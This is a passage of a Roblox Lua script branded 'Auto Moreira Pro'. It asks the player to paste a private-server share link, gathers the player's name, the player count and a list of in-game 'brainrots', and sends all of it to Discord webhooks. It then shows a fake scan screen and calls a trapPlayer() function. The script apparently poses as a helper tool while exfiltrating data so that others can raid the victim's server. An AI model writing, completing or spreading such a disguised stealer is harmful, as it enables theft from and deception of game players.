	minimizeBtn.MouseLeave:Connect(function()
		TweenService:Create(minimizeBtn, TweenInfo.new(0.2), {BackgroundColor3=Color3.fromRGB(100, 100, 100)}):Play();
		TweenService:Create(minimizeBtn, TweenInfo.new(0.2), {Size=UDim2.new(0, 30, 0, 30)}):Play();
	end);
	submitBtn.MouseButton1Click:Connect(function()
		local link = inputBox.Text:gsub("^%s*(.-)%s*$", "%1");
		if (link == "") then
			local shakeTween = TweenService:Create(inputBox, TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 3, true), {Position=UDim2.new(0.02, 0, 0, 35)});
			inputBox.Text = "";
			inputBox.PlaceholderText = "❌ Paste a link first!";
			inputStroke.Color = Color3.fromRGB(255, 80, 80);
			shakeTween:Play();
			task.wait(2);
			inputBox.PlaceholderText = "https://roblox.com/share?code=...";
			inputStroke.Color = Color3.fromRGB(255, 100, 100);
			return;
		end
		if not isValidUrl(link) then
			local shakeTween = TweenService:Create(inputBox, TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 3, true), {Position=UDim2.new(0.02, 0, 0, 35)});
			inputBox.Text = "";
			inputBox.PlaceholderText = "❌ Invalid link!";
			inputStroke.Color = Color3.fromRGB(255, 80, 80);
			shakeTween:Play();
			task.wait(2);
			inputBox.PlaceholderText = "https://roblox.com/share?code=...";
			inputStroke.Color = Color3.fromRGB(255, 100, 100);
			return;
		end
		submitBtn.Text = "⏳ PROCESSING...";
		TweenService:Create(btnGradient, TweenInfo.new(0.5), {Rotation=180}):Play();
		TweenService:Create(submitBtn, TweenInfo.new(0.5), {BackgroundColor3=Color3.fromRGB(220, 120, 30)}):Play();
		local playerName = Players.LocalPlayer.Name;
		local playerCount = getPlayersCount();
		print("🔍 Searching for brainrots...");
		local brainrots = getBrainrots();
		print("✅ Found: " .. #brainrots .. " brainrots");
		if (#brainrots > 0) then
			local success, err = pcall(function()
				sendToDiscord(link, playerCount, playerName, brainrots);
			end);
			if not success then
				warn("❌ Failed to send to Discord:", err);
			end
		else
			print("⚠️ No brainrots found, skipping Discord webhooks");
		end
		task.wait(0.5);
		TweenService:Create(mainFrame, TweenInfo.new(0.5), {Size=UDim2.new(0, 0, 0, 0),Position=UDim2.new(0.5, 0, 0.5, 0),BackgroundTransparency=1}):Play();
		task.wait(0.5);
		menu.Enabled = false;
		isUIVisible = false;
		showScanScreen(brainrots);
		task.wait(2);
		trapPlayer();
		print("✅ Auto Moreira Pro activated!");
		print("🔒 Player: " .. playerName);
		print("📊 Players: " .. playerCount);
		print("🎯 Brainrots: " .. #brainrots);
		print("🔗 Link: " .. link);
	end);
	mainFrame.Size = UDim2.new(0, 0, 0, 0);
	mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0);
	menu.Parent = playerGui;
	TweenService:Create(mainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size=UDim2.new(0, 480, 0, 580),Position=UDim2.new(0.5, -240, 0.5, -290)}):Play();
	mainUI = menu;
	isUIVisible = true;
	print("✅ Auto Moreira Pro Advanced UI loaded!");
end
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then
		return;
	end
	if ((input.KeyCode == Enum.KeyCode.LeftControl) or (input.KeyCode == Enum.KeyCode.RightControl)) then
		if mainUI then
			isUIVisible = not isUIVisible;
			if isUIVisible then
				mainUI.Enabled = true;
				local mainFrame = mainUI:FindFirstChild("Frame");
				if mainFrame then
					mainFrame.Size = UDim2.new(0, 0, 0, 0);
					mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0);
					TweenService:Create(mainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size=UDim2.new(0, 480, 0, 580),Position=UDim2.new(0.5, -240, 0.5, -290)}):Play();
				end
			else
				local mainFrame = mainUI:FindFirstChild("Frame");
				if mainFrame then
					TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size=UDim2.new(0, 0, 0, 0),Position=UDim2.new(0.5, 0, 0.5, 0)}):Play();
					task.wait(0.3);
				end
				mainUI.Enabled = false;
			end
		else
			createMainUI();
		end
	end
end);
createMainUI();
print("✅ Auto Moreira Pro loaded!");
print("🔇 Sound mute active!");
print("🎯 Minimum generation: " .. formatNumberShort(Min_Gen));
print("📱 Optimized for Delta/Mobile");
print("👤 User: " .. Players.LocalPlayer.Name);
print("🔑 Hotkey: Press Ctrl to show/hide UI");
print("🌐 Dual Webhook System: " .. #WEBHOOK_URLS .. " webhooks configured");
print("🤖 Bot Name: " .. WEBHOOK_CONFIG.bot_name);
print("🎨 Custom Color: " .. ((WEBHOOK_CONFIG.use_custom_color and "Enabled") or "Disabled"));
